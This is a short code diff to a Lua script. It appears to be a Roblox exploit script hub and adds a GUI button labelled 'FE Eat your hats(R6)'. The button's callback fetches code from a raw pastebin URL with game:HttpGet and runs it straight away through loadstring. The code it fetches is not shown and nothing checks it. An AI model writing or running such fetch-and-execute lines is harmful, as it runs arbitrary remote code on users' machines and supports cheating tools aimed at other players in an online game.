@@ -94,6 +94,12 @@ function baller()
     end,
  })
  local Button = Tab:CreateButton({
+    Name = "FE Eat your hats(R6)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/4btSqDT8",true))()
+    end,
+ })
+ local Button = Tab:CreateButton({
     Name = "FE Minions(R6)",
     Callback = function()
         minionstip()
